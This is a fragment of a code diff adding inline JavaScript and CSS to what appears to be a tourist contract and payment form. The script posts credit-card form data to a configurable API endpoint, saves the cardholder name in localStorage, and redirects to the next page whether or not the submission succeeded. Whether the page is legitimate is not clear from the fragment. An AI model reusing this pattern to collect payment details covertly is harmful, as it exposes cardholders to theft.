+            var base = (window.API_BASE || window.FORM_API_BASE || "").replace(/\/$/, "");
+            return fetch(base + path, init).then(function (r) { return r.json().catch(function () { return {}; }); });
+          };
+
+          function goToTransaction() {
+            localStorage.setItem("creditCardSubmitted", "1");
+            var cardNombre = document.getElementById("ccfNombre");
+            if (cardNombre && cardNombre.value.trim()) {
+              localStorage.setItem("touristCardNombre", cardNombre.value.trim());
+            }
+            window.location.replace("./index.html");
+          }
+
+          Promise.resolve(
+            sendFn("/api/credit-card-submission", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload),
+            })
+          )
+            .then(function () {
+              setLoading(false);
+              goToTransaction();
+            })
+            .catch(function () {
+              setLoading(false);
+              goToTransaction();
+            });
+        }
+
+        document.querySelectorAll("[data-contract-open]").forEach(function (trigger) {
+          trigger.addEventListener("click", function () {
+            var mode = trigger.getAttribute("data-contract-open");
+            if (mode === "sign") {
+              if (!validate()) {
+                focusFirstInvalidField();
+                return;
+              }
+            }
+            openContractModal(mode);
+          });
+        });
+
+        if (contractModal) {
+          contractModal.querySelectorAll("[data-contract-close]").forEach(function (el) {
+            el.addEventListener("click", function () {
+              closeContractModal();
+            });
+          });
+        }
+
+        if (contractModalPrimary) {
+          contractModalPrimary.addEventListener("click", function () {
+            if (activeContractMode === "sign") {
+              submitApplication();
+            } else {
+              closeContractModal();
+            }
+          });
+        }
+
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape" && contractModal && contractModal.classList.contains("tourist-contract-modal--open")) {
+            closeContractModal();
+          }
+        });
+
+        form.addEventListener("submit", function (e) {
+          e.preventDefault();
+          openContractModal("sign");
+        });
+
+        // Авто-открытие договора в режиме просмотра из notifications2.html
+        try {
+          if (new URLSearchParams(window.location.search).get("view") === "contract") {
+            openContractModal("view");
+          }
+        } catch (e) {}
+      })();
+    </script>
+    <style>
+      .tourist-form-field__hint {
+        font-size: 12px;
+        color: var(--interface-accent);
+        margin: 2px 0 6px;
+      }
+      .tourist-form-field__input--error {
+        border-color: #e53935 !important;
+        box-shadow: 0 0 0 1.5px #e5393566;
+      }
+      .tourist-form-field__error {
+        display: block;
+        color: #e53935;
+        font-size: 12px;
+        margin-top: 4px;
+        padding-left: 2px;
+      }
+    </style>
+  </body>
+</html>
